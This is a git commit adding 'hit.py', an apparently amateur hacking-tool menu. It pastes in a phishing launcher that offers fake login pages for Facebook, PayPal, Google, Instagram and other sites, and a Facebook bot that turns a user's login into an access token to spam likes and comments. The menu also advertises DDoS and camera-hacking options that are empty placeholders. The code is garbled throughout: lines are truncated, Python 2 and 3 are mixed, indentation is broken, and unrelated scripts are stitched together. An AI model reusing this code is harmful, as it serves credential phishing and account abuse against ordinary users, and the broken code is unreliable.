263503ff2b0ca9b2eb0946d4ed32a0243fa95518
hitlerhack313 <59124860+hitlerhack313@users.noreply.github.com>
2020-01-07 14:48:37 +0200

    Add files via upload

---
+++ hit.py
@@ -0,0 +1,475 @@
+import os
+os. system("clear")
+print("           ●●●●●●●●●●●●●●●       ")
+print("           ● WELCOME TO MY WORLED●      ")
+print("           ●●●●●●●●●●●●●●●       ")
+print("")
+print("")
+print("")
+print("       ♡《《《WELCOME TO MY TOOL》》》♡   ")
+print("")
+print("")
+#print("THIS TOOL WAS BEEN PROGRAMED MY HITLER EGY & MENA MAGDY")
+#print("MY ACC ON FACEBOOK 》https://www.facebook.com/profile.php?id=100005415136153 ") 
+#print("")
+#print("") 
+#print("My YOUTUBE CHNAL SUBSCRIBE NOW》https://youtu.be/iTaZJtXLeaE")	
+	#this code to input user name
+v7x = input("USER NAME : ")
+#print("your name is : " +v7x)
+#print("m3lomat the phone chanal" *100000000)
+#name = input ("hit")
+#v7x = print("nice name....!! ")
+#password = input("write the password = ")
+#if name log in to tool
+#if password == "hitler hack":
+#    print("Correct password...$")
+#    print ("THANK U ....??")
+#    import androidhelper
+#droid = androidhelper.Android()
+#droid.makeToast('Hello friend.....!')
+#print('Hello world!')
+
+#import os
+#os. system("clear")
+
+#"""Speak user generated text."""
+
+#__author__ = 'Damon Kohler <damonkohler@gmail.com>'
+#__copyright__ = 'Copyright (c) 2009, Google Inc.'
+#__license__ = 'Apache License, Version 2.0'
+
+#import androidhelper
+
+#droid = androidhelper.Android()
+#message = droid.dialogGetInput('TTS', 'THIS TOOL HAS BEEN PROGRAMED BY MENA MAGDY').result
+#droid.ttsSpeak(message)
+
+#else:("")
+#    print("........♤..ERORR..♤...............")    
+#    print("WRITE THE CORRECT PASSWORD")
+#    print("go to my CHANEL to get corect password")  
+#    print("=======》M3LOMAT THE PHONE《======")   
+
+#v = 0
+#while v < 10 :
+#    print (v)
+#    v=v+1
+
+for v in range (10) :
+    print("PROSESS")
+    print("Done....■□■□■!!")
+    print("WORKED")
+
+import os
+os. system("clear")
+
+#start programing 🔥🔥
+
+#اللوجو هيكون هنا
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+print("")
+
+
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("《1》TO MAKE FACKE BAGES ☆")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("《2》INSTALL METASPLOIT☆")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("《3》TO GET NUMBERS ☆")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("《4》 DDOS ATTACK ☆☆☆ ")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("《5》HACK CAMERA WITH HTTPS ☆")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("《6》GET WEBSITE IP FROM DNS☆")
+print("☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆")
+print("")
+
+
+
+
+print("")
+print("")
+print("")
+hit3 = input(" WRITE YOUR NUMBER 》")
+    
+    
+    
+if hit3 == "1" :    
+    print("      Done....■□■□■!!")
+import os
+
+class Gr:
+    def StyleAndColors(self, text):
+        # ### color ### #
+        text = text.replace('W#', '\033[1;37m')
+        text = text.replace('BL#', '\033[1;30m')
+        text = text.replace('R#', '\033[1;31m')
+        text = text.replace('G#', '\033[1;32m')
+        text = text.replace('Y#', '\033[1;33m')
+        text = text.replace('B#', '\033[1;34m')
+        text = text.replace('P#', '\033[1;35m')
+        text = text.replace('C#', '\033[1;36m')
+
+        # ### style ### #
+        text = text.replace(' [', '\033[1;33m [\033[1;37m')
+        text = text.replace('] ', '\033[1;33m] ')
+        text = text.replace('--', '\033[1;32m--')
+        return text
+
+    def list_main(self):
+        style = '''
+C# _______ _________ _______          _________ _        _______
+B#(  ____ \\\\__   __/(  ____ \\|\\     /|\\__   __/( (    /|(  _>
+C#| (    \\/   ) (   | (    \\/| )   ( |   ) (   |  \\  ( || (   >
+B#| (__       | |   | (_____ | (___) |   | |   |   \\ | || |
+C#|  __)      | |   (_____  )|  ___  |   | |   | (\\ \\) || | ____
+B#| (         | |         ) || (   ) |   | |   | | \\   || | \\_ >
+C#| )      ___) (___/\\____) || )   ( |___) (___| )  \\  || (___)>
+B#|/       \\_______/\\_______)|/     \\|\\_______/|/    )_)(____>
+
+                   R# # ### W#V7x-FishingR# ### #
+                          R# <C# 1.2 vR# >G#
+
+╔-------------------------------------------------------------╗
+|                                                             |
+|  [01] - facebook     [06] - instafollowers   [11] - Reddit G# |
+|  [02] - instagram    [07] - github           [12] - pubg   G# |
+|  [03] - one.com      [08] - yahoo            [13] - clash  G# |
+|  [04] - google       [09] - wordpress        [14] - pubg2  G# |
+|  [05] - paypal       [10] - twitter          [15] - MyPage G# |
+|                                                             |
+╚-------------------------------------------------------------╝
+'''
+        return self.StyleAndColors(style)
+
+class main(Gr):
+        def __init__(self):
+                os.system('clear')
+                try:
+                        print (self.list_main())    
+                        self.Functions()
+                except KeyboardInterrupt:
+                        exit()
+
+        def FunctionsRun(self,NameFunction):
+                os.chdir('templates/%s'%NameFunction)
+                os.system('python3 main')
+
+        def Functions(self):
+                user = input('\033[1;33m >   \033[1;37m').replace(' ','')
+                print('')
+                V7xFishing = {
+                1:'Fasebook',
+                2:'Instagram',
+                3:'One',
+                4:'Google',
+                5:'Paypal',
+                6:'Instafollowers',
+                7:'Github',
+                8:'Yahoo',
+                9:'Wordpress',
+                10:'Twitter',
+                11:'Reddit',
+                12:'pubg',
+                13:'Clash',
+                14:'pubg2',
+                15:'MyPage',
+                                        }
+                try:
+                        self.FunctionsRun(V7xFishing[int(user)])
+                except :
+                        print('\033[1;31m[!] Not found [!]\n')
+                        self.Functions()
+
+if __name__ == '__main__':
+        main()
+ 
+ 
+ 
+    
+   
+if hit3 == "2" :
+    print("      Done....■□■□■!!")
+    
+    #سورس الميتااسبلويت  
+    
+    
+    
+    
+    
+       
+if hit3 == "3" :
+    print("      Done....■□■□■!!")
+###################################################################
+#                        Import Module
+import json , sys , hashlib , os , time , marshal, getpass
+###################################################################
+'''
+     Jangan Direcode ya bosku , tinggal make apa susahnya sih
+'''
+###################################################################
+#                             COLOR
+if sys.platform in ["linux","linux2"]:
+        W = "\033[0m"
+        G = '\033[32;1m'
+        R = '\033[31;1m'
+else:
+        W = ''
+        G = ''
+        R = ''
+###################################################################
+#                      Exception
+try:
+        import requests
+except ImportError:
+        print R + '_   _'.center(44)
+        print "o' \.=./ `o".center(44)
+        print '(o o)'.center(44)
+        print 'ooO--(_)--Ooo'.center(44)
+        print W + ' '                                                     print ('O S I F').center(44)
+        print ' '
+        print "[!] Can't import module 'requests'\n"
+        sys.exit()
+####################################################################
+#                    Set Default encoding
+reload (sys)
+sys . setdefaultencoding ( 'utf8' )
+####################################################################
+#                       I don't know
+jml = []
+jmlgetdata = []
+n = []
+####################################################################
+#                        BANNER
+def baliho():
+        try:
+                token = open('cookie/token.log','r').read()
+                r = requests.get('https://graph.facebook.com/me?access_token=' + token)
+                a = json.loads(r.text)
+                name = a['name']
+                n.append(a['name'])
+
+                print R + '_     _'.center(44)
+                print "o' \.=./ `o".center(44)
+                print '(o o)'.center(44)
+                print 'ooO--(_)--Ooo'.center(44)
+                print ' ' + W
+                print ('[*] ' + name + ' [*]').center(44)
+                print ' '
+
+        except (KeyError,IOError):
+                print R + '_     _'.center(44)
+                print "o' \.=./ `o".center(44)
+                print '(o o)'.center(44)
+                print 'ooO--(_)--Ooo'.center(44)
+                print ' ' + W
+                print ('O S I F').center(44)
+                print (W + '     [' + G +'Open Source Information Facebook'+ W + ']')
+                print ' '
+####################################################################
+#                   Print In terminal
+def show_program():
+print '''
+   %sNumber                  INFO%s
+ ----------   ------------------------------------
+
+   [ 01 ]      like
+   [ 02 ]      reaction 'LOVE'
+   [ 03 ]      reaction 'WOW'
+   [ 04 ]      reaction 'HAHA'
+   [ 05 ]      reaction 'SAD'
+   [ 06 ]      reaction 'ANGRY'
+
+   [ 00 ]      back to menu bot
+'''%(G,W)
+####################################################################
+#                     GENERATE ACCESS TOKEN
+def get(data):
+        print '[*] Generate access token '
+
+        try:
+                os.mkdir('cookie')
+        except OSError:
+                pass
+
+        b = open('cookie/token.log','w')
+        try:
+                r = requests.get('https://api.facebook.com/restserver.php',params=data)
+                a = json.loads(r.text)
+
+                b.write(a['access_token'])
+                b.close()
+                print '[*] successfully generate access token'
+                print '[*] Your access token is stored in cookie/token.log'
+                exit()
+        except KeyError:
+                print '[!] Failed to generate access token'
+                print '[!] Check your connection / email or password'
+                os.remove('cookie/token.log')
+                main()
+        except requests.exceptions.ConnectionError:
+                print '[!] Failed to generate access token'
+                print '[!] Connection error !!!'
+                os.remove('cookie/token.log')
+                main()
+def id():
+        print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');p>
+        x = hashlib.new('md5')
+        x.update(sig)
+
+        data.update({'sig':x.hexdigest()})
+        get(data)
+####################################################################
+#                           BOT
+                        # Execute #
+def post():
+        global token , WT
+
+        try:
+          if WT == 'wallpost':
+                print '[*] fetching all posts id'
+
+                r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&acce>
+                result = json.loads(r.text)
+
+                for i in result['home']['data']:
+                        print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(>
+                return result['home']['data']
+
+          elif WT == 'me':
+                print '[*] fetching all posts id'
+
+                r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&acc>
+                result = json.loads(r.text)
+
+                for i in result['feed']['data']:except KeyError:
+                print '[!] failed to retrieve all post id'
+                print '[!] Stopped'
+                bot()
+        except requests.exceptions.ConnectionError:
+                print '[!] Connection Error'
+                print '[!] Stopped'
+                bot()
+        except KeyboardInterrupt:
+                print '\r[!] Stopped                                      '
+                bot()
+def like(posts , amount):
+        global type , token , WT
+
+        print '\r[*] All posts id successfuly retrieved            '
+        print '[*] Start'
+
+        try:
+                counter = 0
+                for post in posts:
+
+                        if counter >= amount:
+                                break
+                        else:
+                                counter += 1
+
+                        parameters = {'access_token' : token , 'type' : type}
+                        url = "https://graph.facebook.com/{0}/reactions".format(post['i>
+                        s = requests.post(url, data = parameters)
+
+                        id = post['id'].split('_')[0]
+
+                        try:
+                                print '\r' + W + '[' + G + id + W + '] ' + post['messag>
+                        except KeyError:
+                                try:
+                                        print '\r' + W + '[' + G + id + W + '] ' + post>
+                                except KeyError:
+                                        print '\r' + W + '[' + G + id + W + '] Successf>
+
+                print '\r[*] Done                   '
+                menu_reaction_ask()
+        except KeyboardInterrupt:
+                print '\r[!] Stopped                     '
+                menu_reaction_ask()
+def comment(posts , amount):
+        global message , token
+
+        print '\r[*] All posts id successfuly retrieved          '
+        print '[*] Start'
+
+        try:
+                counter = 0
+                for post in posts:
+                        if counter >= amount:
+                                break
+                        else:
+                                counter += 1
+
+                        parameters = {'access_token' : token, 'message' : message}
+                        url = "https://graph.facebook.com/{0}/comments".format(post['id>
+                        s = requests.post(url, data = parameters)
+
+                        id = post['id'].split('_')[0]
+
+                        try:
+                           
+                    
+                    
+                    
+         
+      
+    
+   #استخراج ارقام اوسيف     
+
+if hit3 == "4" :
+    print("      Done....■□■□■!!")
+    
+   
+  #سورس الجولدن اييي
+
+
+
+
+if hit3 == "5" :
+    print("      Done....■□■□■!!")
+    
+ 
+   #اداه saychees
+
+
+
+
+if hit3 == "6" :
+    print("     Done....■□■□■!! ")
+import socket
+import sys
+print ("ENTER YOUR TARGET OR DNS : ")
+hostname = input()
+ip=socket.gethostbyname(hostname)
+print ("Host Name Is : ",hostname,            
+	    '/n' 'TARGET IP IS : ',ip)   
+
+
+
+
+
+
+
+
+
+
